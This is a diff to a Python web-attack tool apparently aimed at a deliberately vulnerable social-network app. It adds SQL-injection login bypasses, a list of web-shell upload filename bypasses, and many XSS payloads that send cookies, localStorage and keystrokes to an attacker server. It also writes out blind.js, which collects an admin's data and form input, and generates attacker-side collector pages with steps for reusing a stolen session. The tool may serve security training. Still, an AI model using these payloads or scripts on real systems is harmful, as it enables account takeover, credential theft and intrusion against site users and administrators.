@@ -255,50 +255,64 @@ class AdvancedVulnerableSNSAttacker:
                 data = {'username': username, 'password': password}
                 response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                 
-                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
-                    print(f"[+] SUCCESS! Logged in with advanced technique")
-                    print(f"    Final URL: {response.url}")
+
+                # 디버깅 출력 추가
+                print(f"    Response URL: {response.url}")
+                print(f"    Response status: {response.status_code}")
+
+                # 로그인 성공 조건 수정
+                if 'index.php' in response.url:
+                    # 실제로 로그인되었는지 추가 확인
+                    if 'login.php' not in response.url:  # 로그인 페이지가 아닌지 확인
+                        print(f"[+] SUCCESS! Logged in with advanced technique")
+                        print(f"    Final URL: {response.url}")
+                        
+                        # 여기가 중요! 실제로 로그인되었는지 콘텐츠 확인
+                        if '로그인' in response.text or 'Login' in response.text or 'login' in response.text.lower():
+                            if '로그아웃' not in response.text and 'logout' not in response.text.lower():
+                                print("[-] Warning: Still seeing login form, might be failed login")
+                                continue
                     
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
-                    if points_text:
-                        points_match = re.search(r'(\d+)\s*P', points_text)
-                        if points_match:
-                            self.current_points = int(points_match.group(1))
-                            print(f"    Current Points: {self.current_points}P")
-                    
-                    self.logged_in = True
-                    self.get_attacker_user_id()
-                    success_count += 1
-                    
-                    vuln_info = {
-                        'url': login_url,
-                        'username': username,
-                        'password': password,
-                        'description': desc,
-                        'impact': 'CRITICAL - Authentication bypass with WAF evasion',
-                        'cvss_score': 9.8,
-                        'waf_bypass_technique': desc
-                    }
-                    self.vulnerabilities['sql_injection'].append(vuln_info)
-                    
-                    self.log_event(
-                        'SQL_INJECTION_ADVANCED',
-                        f'Successfully bypassed authentication using advanced SQL injection: {desc}',
-                        'CRITICAL',
-                        {
-                            'payload': f"username={username}, password={password}",
-                            'method': desc,
-                            'account': 'admin',
-                            'points': self.current_points,
-                            'waf_bypass': True
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        points_text = soup.find(text=re.compile(r'\d+\s*P'))
+                        if points_text:
+                            points_match = re.search(r'(\d+)\s*P', points_text)
+                            if points_match:
+                                self.current_points = int(points_match.group(1))
+                                print(f"    Current Points: {self.current_points}P")
+                        
+                        self.logged_in = True
+                        self.get_attacker_user_id()
+                        success_count += 1
+                        
+                        vuln_info = {
+                            'url': login_url,
+                            'username': username,
+                            'password': password,
+                            'description': desc,
+                            'impact': 'CRITICAL - Authentication bypass with WAF evasion',
+                            'cvss_score': 9.8,
+                            'waf_bypass_technique': desc
                         }
-                    )
-                    
-                    # 첫 번째 성공 후 계속 테스트할지 선택
-                    if success_count >= 3:  # 3개 이상 성공하면 중단
-                        print(f"\n[+] Multiple bypasses found. Stopping SQL injection tests.")
-                        return True
+                        self.vulnerabilities['sql_injection'].append(vuln_info)
+                        
+                        self.log_event(
+                            'SQL_INJECTION_ADVANCED',
+                            f'Successfully bypassed authentication using advanced SQL injection: {desc}',
+                            'CRITICAL',
+                            {
+                                'payload': f"username={username}, password={password}",
+                                'method': desc,
+                                'account': 'admin',
+                                'points': self.current_points,
+                                'waf_bypass': True
+                            }
+                        )
+                        
+                        # 첫 번째 성공 후 계속 테스트할지 선택
+                        if success_count >= 3:  # 3개 이상 성공하면 중단
+                            print(f"\n[+] Multiple bypasses found. Stopping SQL injection tests.")
+                            return True
                 else:
                     print(f"[-] Failed - Still on: {response.url}")
                     
@@ -335,27 +349,32 @@ class AdvancedVulnerableSNSAttacker:
                     data = {'username': username, 'password': password}
                     response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                     
-                    if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
-                        print(f"[+] SUCCESS with default credentials")
-                        self.logged_in = True
+                    # 디버깅 출력 추가
+                    print(f"    Response URL: {response.url}")
+                    print(f"    Response status: {response.status_code}")
+
+                    if 'index.php' in response.url:
+                        if 'login.php' not in response.url:
+                            print(f"[+] SUCCESS with default credentials")
+                            self.logged_in = True
                         
-                        soup = BeautifulSoup(response.text, 'html.parser')
-                        points_text = soup.find(text=re.compile(r'\d+\s*P'))
-                        if points_text:
-                            points_match = re.search(r'(\d+)\s*P', points_text)
-                            if points_match:
-                                self.current_points = int(points_match.group(1))
-                        
-                        self.get_attacker_user_id()
-                        
-                        self.log_event(
-                            'WEAK_CREDENTIALS',
-                            f'Logged in with default credentials: {username}/{password}',
-                            'HIGH',
-                            {'username': username, 'password': password}
-                        )
-                        
-                        return True
+                            soup = BeautifulSoup(response.text, 'html.parser')
+                            points_text = soup.find(text=re.compile(r'\d+\s*P'))
+                            if points_text:
+                                points_match = re.search(r'(\d+)\s*P', points_text)
+                                if points_match:
+                                    self.current_points = int(points_match.group(1))
+                            
+                            self.get_attacker_user_id()
+                            
+                            self.log_event(
+                                'WEAK_CREDENTIALS',
+                                f'Logged in with default credentials: {username}/{password}',
+                                'HIGH',
+                                {'username': username, 'password': password}
+                            )
+                            
+                            return True
                 except:
                     continue
         
@@ -390,49 +409,49 @@ class AdvancedVulnerableSNSAttacker:
         # 다양한 우회 기법
         bypass_techniques = [
             # 1. Double Extension
-            ('shell.jpg.php', 'image/jpeg', 'basic', 'Double extension'),
-            ('shell.php.jpg', 'image/jpeg', 'basic', 'Reverse double extension'),
+            ('shell98.jpg.php', 'image/jpeg', 'basic', 'Double extension'),
+            ('shell98.php.jpg', 'image/jpeg', 'basic', 'Reverse double extension'),
             
             # 2. Case Variation
-            ('shell.PHP', 'application/x-php', 'basic', 'Uppercase extension'),
-            ('shell.PhP', 'application/x-php', 'basic', 'Mixed case extension'),
-            ('shell.pHp', 'application/x-php', 'basic', 'Mixed case variant'),
+            ('shell98.PHP', 'application/x-php', 'basic', 'Uppercase extension'),
+            ('shell98.PhP', 'application/x-php', 'basic', 'Mixed case extension'),
+            ('shell98.pHp', 'application/x-php', 'basic', 'Mixed case variant'),
             
             # 3. Alternative PHP Extensions
-            ('shell.php5', 'application/x-php', 'basic', 'PHP5 extension'),
-            ('shell.phtml', 'application/x-php', 'basic', 'PHTML extension'),
-            ('shell.php3', 'application/x-php', 'basic', 'PHP3 extension'),
-            ('shell.php4', 'application/x-php', 'basic', 'PHP4 extension'),
-            ('shell.phps', 'application/x-php', 'basic', 'PHPS extension'),
-            ('shell.phar', 'application/x-php', 'basic', 'PHAR extension'),
+            ('shell98.php5', 'application/x-php', 'basic', 'PHP5 extension'),
+            ('shell98.phtml', 'application/x-php', 'basic', 'PHTML extension'),
+            ('shell98.php3', 'application/x-php', 'basic', 'PHP3 extension'),
+            ('shell98.php4', 'application/x-php', 'basic', 'PHP4 extension'),
+            ('shell98.phps', 'application/x-php', 'basic', 'PHPS extension'),
+            ('shell98.phar', 'application/x-php', 'basic', 'PHAR extension'),
             
             # 4. Null Byte Injection
-            ('shell.php\x00.jpg', 'image/jpeg', 'basic', 'Null byte injection'),
-            ('shell.php%00.jpg', 'image/jpeg', 'basic', 'URL encoded null byte'),
+            ('shell98.php\x00.jpg', 'image/jpeg', 'basic', 'Null byte injection'),
+            ('shell98.php%00.jpg', 'image/jpeg', 'basic', 'URL encoded null byte'),
             
             # 5. Unicode Tricks
-            ('shell.p\u0068p', 'application/x-php', 'basic', 'Unicode h'),
-            ('shell.ph\u0070', 'application/x-php', 'basic', 'Unicode p'),
+            ('shell98.p\u0068p', 'application/x-php', 'basic', 'Unicode h'),
+            ('shell98.ph\u0070', 'application/x-php', 'basic', 'Unicode p'),
             
             # 6. MIME Type Confusion
-            ('shell.jpg', 'application/x-php', 'with_image_header', 'JPEG header with PHP'),
-            ('shell.gif', 'image/gif', 'basic', 'GIF with wrong MIME'),
+            ('shell98.jpg', 'application/x-php', 'with_image_header', 'JPEG header with PHP'),
+            ('shell98.gif', 'image/gif', 'basic', 'GIF with wrong MIME'),
             
             # 7. Special Characters
-            ('shell .php', 'application/x-php', 'basic', 'Space in filename'),
-            ('shell.php.', 'application/x-php', 'basic', 'Trailing dot'),
-            ('shell.php....', 'application/x-php', 'basic', 'Multiple trailing dots'),
+            ('shell98 .php', 'application/x-php', 'basic', 'Space in filename'),
+            ('shell98.php.', 'application/x-php', 'basic', 'Trailing dot'),
+            ('shell98.php....', 'application/x-php', 'basic', 'Multiple trailing dots'),
             
             # 8. htaccess Upload
             ('.htaccess', 'application/octet-stream', 'htaccess', 'htaccess override'),
             
             # 9. Encoded Payloads
-            ('shell.php', 'application/x-php', 'encoded', 'Base64 encoded payload'),
-            ('shell.php', 'application/x-php', 'obfuscated', 'Obfuscated functions'),
+            ('shell98.php', 'application/x-php', 'encoded', 'Base64 encoded payload'),
+            ('shell98.php', 'application/x-php', 'obfuscated', 'Obfuscated functions'),
             
             # 10. Polyglot Files
-            ('shell.pdf', 'application/pdf', 'pdf_poly', 'PDF polyglot'),
-            ('shell.zip', 'application/zip', 'zip_poly', 'ZIP polyglot')
+            ('shell98.pdf', 'application/pdf', 'pdf_poly', 'PDF polyglot'),
+            ('shell98.zip', 'application/zip', 'zip_poly', 'ZIP polyglot')
         ]
         
         # htaccess 내용
@@ -1344,6 +1363,616 @@ php_flag engine on
                 'attacker_id': self.attacker_user_id
             }
         )
+
+    def test_xss_advanced(self):
+        """고급 XSS 공격 - 쿠키/세션 탈취"""
+        self.print_section("Advanced XSS - Cookie/Session Hijacking")
+        
+        if not self.logged_in:
+            print("[-] Login required")
+            return False
+        
+        post_url = f"{self.base_url}/new_post.php"
+        comment_url = f"{self.base_url}/comment.php"
+        profile_url = f"{self.base_url}/profile.php"
+        
+        print("[*] Testing XSS payloads for cookie/session theft...")
+        
+        # attacker_server에서 http:// 제거
+        attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+        
+        # 다양한 XSS 페이로드
+        xss_payloads = [
+            # 기본 쿠키 탈취
+            (
+                f'<script>document.location="{self.attacker_server}/steal?c="+document.cookie</script>',
+                'Basic cookie stealing'
+            ),
+            
+            # Base64 인코딩된 페이로드
+            (
+                '<script>eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9hdHRhY2tlci5jb20vc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZQ=="))</script>',
+                'Base64 encoded payload'
+            ),
+            
+            # Image 태그 이용
+            (
+                f'<img src=x onerror="this.src=\'{self.attacker_server}/img?c=\'+document.cookie">',
+                'Image tag XSS'
+            ),
+            
+            # SVG 이용
+            (
+                f'<svg onload="fetch(\'{self.attacker_server}/svg\',{{method:\'POST\',body:document.cookie}})">',
+                'SVG with fetch API'
+            ),
+            
+            # 이벤트 핸들러
+            (
+                f'<div onmouseover="new Image().src=\'{self.attacker_server}/mouse?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+                'Event handler XSS'
+            ),
+            
+            # XMLHttpRequest (여러 줄 문자열)
+            (
+                f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}/xhr",true);x.send("c="+document.cookie)</script>',
+                'XMLHttpRequest cookie theft'
+            ),
+            
+            # LocalStorage 탈취 (간단 버전)
+            (
+                f'<script>fetch("{self.attacker_server}/steal",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+                'Cookie and localStorage theft'
+            ),
+            
+            # 키로거 (간단 버전)
+            (
+                f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}/key?k="+btoa(k);k=""}}}}</script>',
+                'Keylogger injection'
+            ),
+            
+            # 필터 우회 - String.fromCharCode
+            (
+                '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
+                'Character code bypass'
+            ),
+            
+            # 필터 우회 - 대소문자
+            (
+                f'<ScRiPt>document.location="{self.attacker_server}/c?"+document.cookie</ScRiPt>',
+                'Case variation bypass'
+            ),
+            
+            # Blind XSS 추가
+            (
+                f'<script src="{self.attacker_server}/blind.js"></script>',
+                'Blind XSS - External script'
+            ),
+
+            # 추가 필터 우회 페이로드들
+            (
+                '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
+                'HTML entity encoding bypass'
+            ),
+            (
+                '<ScRiPt>alert(document.cookie)</sCripT>',
+                'Mixed case bypass'
+            ),
+            (
+                '<body onload="alert(document.cookie)">',
+                'Body onload event'
+            ),
+            (
+                '<input onfocus="alert(document.cookie)" autofocus>',
+                'Autofocus input'
+            ),
+            (
+                '<a href="javascript:alert(document.cookie)">Click me</a>',
+                'JavaScript URL'
+            ),
+            (
+                '<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">',
+                'Data URL iframe'
+            )
+        ]
+        
+        success_count = 0
+        successful_payloads = []
+        
+        # 1. 게시글에 XSS 시도
+        for payload, description in xss_payloads:
+            try:
+                self.add_delay()
+                
+                print(f"\n[*] Testing: {description}")
+                print(f"    Payload length: {len(payload)}")
+                
+                # 게시글 작성
+                data = {'content': payload}
+                response = self.session.post(post_url, data=data, allow_redirects=True)
+                
+                if 'index.php' in response.url:
+                    # 게시글이 올라갔는지 확인
+                    check = self.session.get(f"{self.base_url}/index.php")
+                    
+                    # XSS 페이로드가 그대로 있는지 확인 (필터링 안됨)
+                    if any(indicator in check.text for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
+                        print(f"[+] XSS payload injected successfully!")
+                        success_count += 1
+                        successful_payloads.append(description)
+                        
+                        vuln_info = {
+                            'url': post_url,
+                            'payload': payload,
+                            'description': description,
+                            'type': 'Stored XSS',
+                            'impact': 'CRITICAL - Cookie/Session theft possible',
+                            'cvss_score': 9.0,
+                            'attack_vector': f'{self.attacker_server}/steal'
+                        }
+                        self.vulnerabilities['xss'].append(vuln_info)
+                        
+                        self.log_event(
+                            'XSS_COOKIE_THEFT',
+                            f'Successfully injected XSS payload: {description}',
+                            'CRITICAL',
+                            {
+                                'payload_type': description,
+                                'target': 'new_post',
+                                'steal_endpoint': f'{self.attacker_server}/steal'
+                            }
+                        )
+                        
+                        # 첫 번째 성공 후 빠르게 다른 것들도 테스트
+                        if success_count >= 3:
+                            break
+                    else:
+                        print(f"[-] Payload filtered or encoded")
+                        
+            except Exception as e:
+                print(f"[-] Error: {str(e)[:50]}")
+        
+        # 2. 프로필이나 댓글에도 시도
+        if success_count == 0:
+            print("\n[*] Trying alternative injection points...")
+            
+            # 프로필 업데이트
+            simple_payload = f'<img src=x onerror="new Image().src=\'{self.attacker_server}/profile?c=\'+document.cookie">'
+            data = {
+                'bio': simple_payload,
+                'website': f'javascript:document.location="{self.attacker_server}/website?c="+document.cookie//";'
+            }
+            
+            try:
+                response = self.session.post(profile_url, data=data)
+                if 'success' in response.text.lower() or 'profile' in response.text.lower():
+                    print("[+] XSS in profile bio/website field!")
+                    success_count += 1
+                    
+                    vuln_info = {
+                        'url': profile_url,
+                        'payload': simple_payload,
+                        'description': 'Profile field XSS',
+                        'type': 'Stored XSS',
+                        'impact': 'HIGH - Profile-based XSS',
+                        'cvss_score': 8.0,
+                        'attack_vector': f'{self.attacker_server}/profile'
+                    }
+                    self.vulnerabilities['xss'].append(vuln_info)
+            except:
+                pass
+        
+        # 3. 공격 수신 페이지 생성
+        self.generate_cookie_stealer_page()
+        self.generate_blind_xss_script()
+        
+        print(f"\n[*] XSS Results: {success_count} successful injections")
+        if successful_payloads:
+            print(f"[+] Successful techniques: {', '.join(successful_payloads)}")
+        
+        return success_count > 0
+
+    def generate_cookie_stealer_page(self):
+        """쿠키 수집 서버 페이지 생성"""
+        print("\n[*] Generating cookie-stealer.html...")
+        
+        cookie_stealer_html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Cookie Collector</title>
+        <meta charset="utf-8">
+        <style>
+            body {{
+                font-family: monospace;
+                background: #1a1a1a;
+                color: #0f0;
+                padding: 20px;
+            }}
+            .log-entry {{
+                background: #000;
+                border: 1px solid #0f0;
+                padding: 15px;
+                margin: 10px 0;
+                white-space: pre-wrap;
+                word-break: break-all;
+            }}
+            h1 {{
+                text-align: center;
+                color: #0f0;
+                text-shadow: 0 0 10px #0f0;
+            }}
+            .stats {{
+                background: #000;
+                border: 2px solid #0f0;
+                padding: 20px;
+                margin: 20px 0;
+            }}
+        </style>
+    </head>
+    <body>
+        <h1>🍪 Cookie Stealer - Live Monitor 🍪</h1>
+        
+        <div class="stats">
+            <h2>Statistics</h2>
+            <p>Total Cookies Stolen: <span id="total">0</span></p>
+            <p>Unique Victims: <span id="unique">0</span></p>
+            <p>Last Update: <span id="lastUpdate">Never</span></p>
+        </div>
+        
+        <h2>Captured Data:</h2>
+        <div id="logs"></div>
+        
+        <script>
+            // 실제 구현에서는 서버 측 로깅 필요
+            const logs = [];
+            const victims = new Set();
+            
+            // URL 파라미터에서 쿠키 추출 (테스트용)
+            function checkNewData() {{
+                const params = new URLSearchParams(window.location.search);
+                const cookie = params.get('c');
+                const keylog = params.get('k');
+                
+                if (cookie) {{
+                    const entry = {{
+                        timestamp: new Date().toISOString(),
+                        type: 'COOKIE',
+                        data: decodeURIComponent(cookie),
+                        ip: '{self.generate_random_ip()}',
+                        userAgent: navigator.userAgent
+                    }};
+                    
+                    logs.push(entry);
+                    displayLog(entry);
+                    
+                    // 쿠키에서 session_id 추출
+                    const sessionMatch = cookie.match(/session_id=([^;]+)/);
+                    if (sessionMatch) {{
+                        victims.add(sessionMatch[1]);
+                    }}
+                    
+                    updateStats();
+                }}
+                
+                if (keylog) {{
+                    const entry = {{
+                        timestamp: new Date().toISOString(),
+                        type: 'KEYLOG',
+                        data: atob(keylog),
+                        ip: '{self.generate_random_ip()}'
+                    }};
+                    
+                    logs.push(entry);
+                    displayLog(entry);
+                }}
+            }}
+            
+            function displayLog(entry) {{
+                const logDiv = document.createElement('div');
+                logDiv.className = 'log-entry';
+                logDiv.textContent = `[${{entry.timestamp}}] ${{entry.type}}
+    IP: ${{entry.ip}}
+    Data: ${{entry.data}}
+    ${{entry.userAgent ? 'User-Agent: ' + entry.userAgent : ''}}`;
+                
+                document.getElementById('logs').insertBefore(
+                    logDiv, 
+                    document.getElementById('logs').firstChild
+                );
+            }}
+            
+            function updateStats() {{
+                document.getElementById('total').textContent = logs.length;
+                document.getElementById('unique').textContent = victims.size;
+                document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
+            }}
+            
+            // 실시간 모니터링 시뮬레이션
+            setInterval(() => {{
+                // 실제로는 서버에서 새 데이터 확인
+                checkNewData();
+            }}, 1000);
+            
+            // 초기 확인
+            checkNewData();
+            
+            // 가짜 데이터 생성 (데모용)
+            setTimeout(() => {{
+                if (logs.length === 0) {{
+                    const fakeEntry = {{
+                        timestamp: new Date().toISOString(),
+                        type: 'DEMO',
+                        data: 'session_id=fake123; user=admin; token=abc123',
+                        ip: '192.168.1.100'
+                    }};
+                    logs.push(fakeEntry);
+                    displayLog(fakeEntry);
+                    updateStats();
+                }}
+            }}, 3000);
+        </script>
+    </body>
+    </html>"""
+        
+        with open("cookie-stealer.html", 'w', encoding='utf-8') as f:
+            f.write(cookie_stealer_html)
+        
+        print(f"[+] cookie-stealer.html saved!")
+        print(f"[+] Monitor stolen cookies at: {self.attacker_server}/cookie-stealer.html")    
+
+    def generate_blind_xss_script(self):
+        """Blind XSS를 위한 외부 스크립트 생성"""
+        print("\n[*] Generating blind.js...")
+        
+        blind_js_content = f"""
+    // Blind XSS Payload - 관리자 패널에서 실행될 것을 가정
+    (function() {{
+        // 페이지 정보 수집
+        var adminData = {{
+            cookies: document.cookie,
+            url: window.location.href,
+            title: document.title,
+            // HTML 일부만 (너무 크면 전송 실패 가능)
+            html: document.documentElement.innerHTML.substring(0, 5000),
+            localStorage: {{}},
+            sessionStorage: {{}},
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        }};
+        
+        // localStorage 수집
+        try {{
+            for (var key in localStorage) {{
+                adminData.localStorage[key] = localStorage.getItem(key);
+            }}
+        }} catch(e) {{}}
+        
+        // sessionStorage 수집
+        try {{
+            for (var key in sessionStorage) {{
+                adminData.sessionStorage[key] = sessionStorage.getItem(key);
+            }}
+        }} catch(e) {{}}
+        
+        // 관리자 링크 찾기
+        var adminLinks = [];
+        document.querySelectorAll('a').forEach(function(link) {{
+            if (link.href.includes('admin') || link.href.includes('manage') || 
+                link.href.includes('dashboard') || link.href.includes('panel')) {{
+                adminLinks.push(link.href);
+            }}
+        }});
+        adminData.adminLinks = adminLinks;
+        
+        // 데이터 전송
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '{self.attacker_server}/blind-steal', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(adminData));
+        
+        // 백업 전송 방법 (이미지 태그)
+        var img = new Image();
+        img.src = '{self.attacker_server}/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
+        
+        // 키로거 설치
+        document.addEventListener('keypress', function(e) {{
+            var k = new Image();
+            k.src = '{self.attacker_server}/blind-key?k=' + e.key + '&t=' + Date.now();
+        }});
+        
+        // 폼 데이터 가로채기
+        document.addEventListener('submit', function(e) {{
+            var formData = new FormData(e.target);
+            var data = {{}};
+            formData.forEach(function(value, key) {{
+                data[key] = value;
+            }});
+            
+            var f = new Image();
+            f.src = '{self.attacker_server}/blind-form?data=' + btoa(JSON.stringify(data));
+        }});
+    }})();
+    """
+        
+        with open("blind.js", 'w', encoding='utf-8') as f:
+            f.write(blind_js_content)
+        
+        print(f"[+] blind.js saved!")
+        print(f"[+] Blind XSS script will collect admin data when executed")
+
+    def generate_admin_stealer_page(self):
+        """관리자 데이터 수집 페이지 생성"""
+        print("\n[*] Generating admin-stealer.html...")
+        
+        admin_stealer_html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin Panel Data Collector</title>
+        <meta charset="utf-8">
+        <style>
+            body {{
+                font-family: 'Courier New', monospace;
+                background: #0a0a0a;
+                color: #00ff00;
+                padding: 20px;
+                margin: 0;
+            }}
+            .admin-data {{
+                background: #1a1a1a;
+                border: 2px solid #00ff00;
+                padding: 20px;
+                margin: 20px 0;
+                border-radius: 5px;
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            }}
+            h1 {{
+                text-align: center;
+                color: #00ff00;
+                text-shadow: 0 0 15px #00ff00;
+                animation: glow 2s ease-in-out infinite alternate;
+            }}
+            @keyframes glow {{
+                from {{ text-shadow: 0 0 15px #00ff00; }}
+                to {{ text-shadow: 0 0 25px #00ff00, 0 0 35px #00ff00; }}
+            }}
+            .data-section {{
+                background: #000;
+                padding: 15px;
+                margin: 10px 0;
+                border-left: 3px solid #00ff00;
+                overflow-x: auto;
+            }}
+            pre {{
+                margin: 0;
+                white-space: pre-wrap;
+                word-break: break-all;
+            }}
+            .critical {{
+                color: #ff0000;
+                font-weight: bold;
+            }}
+            .warning {{
+                color: #ffaa00;
+            }}
+            .success {{
+                color: #00ff00;
+            }}
+        </style>
+    </head>
+    <body>
+        <h1>🛡️ Admin Panel Data Collector 🛡️</h1>
+        
+        <div class="admin-data">
+            <h2>Blind XSS Results</h2>
+            <div id="blindXssData">
+                <p class="warning">Waiting for admin to trigger blind XSS payload...</p>
+            </div>
+        </div>
+        
+        <div class="admin-data">
+            <h2>Captured Admin Sessions</h2>
+            <div id="adminSessions">
+                <p>No admin sessions captured yet.</p>
+            </div>
+        </div>
+        
+        <div class="admin-data">
+            <h2>Admin Actions Log</h2>
+            <div id="adminActions">
+                <p>Monitoring admin actions...</p>
+            </div>
+        </div>
+        
+        <script>
+            // 실제로는 서버에서 데이터를 가져와야 함
+            let adminCaptures = [];
+            
+            // 데모 데이터 (실제로는 서버에서 받아옴)
+            setTimeout(() => {{
+                const demoData = {{
+                    timestamp: new Date().toISOString(),
+                    type: 'BLIND_XSS',
+                    data: {{
+                        cookies: 'admin_session=abc123def456; role=administrator; csrf_token=xyz789',
+                        url: '{self.base_url}/admin/dashboard.php',
+                        title: 'Admin Dashboard - Vulnerable SNS',
+                        localStorage: {{
+                            'admin_token': 'secret_admin_token_123',
+                            'last_login': '2024-01-15T10:30:00Z'
+                        }},
+                        adminLinks: [
+                            '{self.base_url}/admin/users.php',
+                            '{self.base_url}/admin/settings.php',
+                            '{self.base_url}/admin/logs.php'
+                        ]
+                    }}
+                }};
+                
+                displayAdminData(demoData);
+            }}, 5000);
+            
+            function displayAdminData(capture) {{
+                adminCaptures.push(capture);
+                
+                const blindXssDiv = document.getElementById('blindXssData');
+                blindXssDiv.innerHTML = `
+                    <div class="data-section">
+                        <h3 class="success">✓ Admin Panel Accessed!</h3>
+                        <p><strong>Time:</strong> ${{capture.timestamp}}</p>
+                        <p><strong>URL:</strong> <span class="critical">${{capture.data.url}}</span></p>
+                        <p><strong>Page Title:</strong> ${{capture.data.title}}</p>
+                        
+                        <h4>🍪 Admin Cookies:</h4>
+                        <pre class="critical">${{capture.data.cookies}}</pre>
+                        
+                        <h4>💾 LocalStorage:</h4>
+                        <pre>${{JSON.stringify(capture.data.localStorage, null, 2)}}</pre>
+                        
+                        <h4>🔗 Admin Links Found:</h4>
+                        <ul>
+                            ${{capture.data.adminLinks.map(link => `<li><a href="${{link}}" class="warning">${{link}}</a></li>`).join('')}}
+                        </ul>
+                    </div>
+                `;
+                
+                updateAdminSessions(capture.data.cookies);
+            }}
+            
+            function updateAdminSessions(cookies) {{
+                const sessionsDiv = document.getElementById('adminSessions');
+                const sessionMatch = cookies.match(/admin_session=([^;]+)/);
+                
+                if (sessionMatch) {{
+                    sessionsDiv.innerHTML = `
+                        <div class="data-section">
+                            <p class="success">✓ Admin session captured!</p>
+                            <p><strong>Session ID:</strong> <span class="critical">${{sessionMatch[1]}}</span></p>
+                            <p class="warning">⚠️ This session can be used to impersonate the admin!</p>
+                            
+                            <h4>How to use:</h4>
+                            <ol>
+                                <li>Open browser developer tools (F12)</li>
+                                <li>Go to Application/Storage → Cookies</li>
+                                <li>Add cookie: admin_session = ${{sessionMatch[1]}}</li>
+                                <li>Refresh the page to access admin panel</li>
+                            </ol>
+                        </div>
+                    `;
+                }}
+            }}
+            
+            // 주기적으로 서버에서 새 데이터 확인 (실제 구현 시)
+            setInterval(() => {{
+                // fetch('/blind-xss-data').then(r => r.json()).then(displayAdminData);
+            }}, 5000);
+        </script>
+    </body>
+    </html>"""
+        
+        with open("admin-stealer.html", 'w', encoding='utf-8') as f:
+            f.write(admin_stealer_html)
+        
+        print(f"[+] admin-stealer.html saved!")
     
     # 기존 메서드들 오버라이드
     def test_sql_injection_login(self):
@@ -1772,7 +2401,7 @@ php_flag engine on
             </div>
 """
 
-        # XSS/CSRF 취약점
+        # /CSRF 취약점
         if self.vulnerabilities['csrf']:
             html_content += """
             <h3 style="color: #dc3545; margin-top: 30px;">4️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
@@ -1816,6 +2445,50 @@ php_flag engine on
                 </div>
             </div>
 """
+                
+        # XSS 취약점 (CSRF와 별도로)
+        if self.vulnerabilities['xss']:
+            html_content += """
+            <h3 style="color: #dc3545; margin-top: 30px;">5️⃣ Cross-Site Scripting (XSS)</h3>
+        """
+            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
+                cvss = vuln.get('cvss_score', 0)
+                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
+                html_content += f"""
+                <div class="vuln-card">
+                    <h3>XSS #{idx} - {vuln.get('type', 'Stored XSS')}
+                        <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
+                    </h3>
+                    <div class="vuln-detail">
+                        <strong>취약 URL:</strong> <code>{vuln['url']}</code>
+                    </div>
+                    <div class="vuln-detail">
+                        <strong>공격 페이로드:</strong><br>
+                        <code style="display: block; white-space: pre-wrap; padding: 10px; background: #f8f9fa;">
+        {vuln['payload'][:200]}...</code>
+                    </div>
+                    <div class="vuln-detail">
+                        <strong>공격 설명:</strong> {vuln['description']}
+                    </div>
+                    <div class="vuln-detail">
+                        <strong>데이터 수집 엔드포인트:</strong> <code>{vuln.get('attack_vector', 'N/A')}</code>
+                    </div>
+                    <div class="vuln-detail">
+                        <strong>영향도:</strong> {vuln['impact']}
+                    </div>
+                    <div class="recommendations">
+                        <h3>🔧 수정 방안</h3>
+                        <ul>
+                            <li>모든 사용자 입력에 대해 htmlspecialchars() 적용</li>
+                            <li>Content Security Policy (CSP) 헤더 설정</li>
+                            <li>입력 검증 - 위험한 태그/속성 필터링</li>
+                            <li>출력 인코딩 - 컨텍스트별 적절한 인코딩</li>
+                            <li>HTTPOnly 플래그로 쿠키 보호</li>
+                            <li>DOM 기반 XSS 방지를 위한 안전한 JavaScript 사용</li>
+                        </ul>
+                    </div>
+                </div>
+        """                
 
         # 공격 타임라인
         html_content += """
@@ -1977,6 +2650,11 @@ php_flag engine on
         print("\n[Phase 3: LFI with Filter Evasion]")
         self.add_delay(2, 4)
         self.test_lfi_advanced()
+
+        # 3.5 XSS 테스트 추가
+        print("\n[Phase 3.5: XSS with Cookie/Session Theft]")
+        self.add_delay(2, 4)
+        self.test_xss_advanced()
         
         # 4. Advanced CSRF
         print("\n[Phase 4: CSRF with Defense Bypass]")
@@ -1985,6 +2663,7 @@ php_flag engine on
         
         # 5. Generate attack pages
         self.generate_advanced_fake_gift_page()
+        self.generate_admin_stealer_page()
         
         self.log_event('SCAN_COMPLETE', f'Advanced assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
         
@@ -2046,4 +2725,8 @@ if __name__ == "__main__":
     print(f"🛡️ WAF bypasses attempted: SQL, File Upload, LFI, CSRF")
     print(f"📊 Check the generated reports for detailed findings")
     print(f"🎯 Monitor attacks at: {attacker_server}")
+    print("\n💡 XSS Attack Pages:")
+    print(f"   - cookie-stealer.html: Monitor stolen cookies")
